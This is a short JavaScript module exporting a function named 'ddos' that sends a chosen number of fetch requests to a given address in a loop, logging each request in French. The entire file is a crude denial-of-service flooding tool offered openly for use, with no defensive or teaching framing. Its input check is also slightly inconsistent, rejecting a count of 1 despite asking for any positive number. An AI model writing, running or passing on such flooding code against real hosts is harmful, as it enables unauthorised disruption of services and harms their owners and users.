function ddos(ip, amount) {
    
    if (typeof amount !== 'number' || amount <= 1) {
        throw new Error('Le nombre de requêtes doit être un nombre positif.');
    }
    
    try {
        console.log(ip);
        for (let i = 0; i < amount; i++) {
            fetch(`${ip}`);
            console.log(`Requête envoyée à ${ip}`);
        }
    } catch (error) {
        return error;
    }

}

module.exports = { ddos };
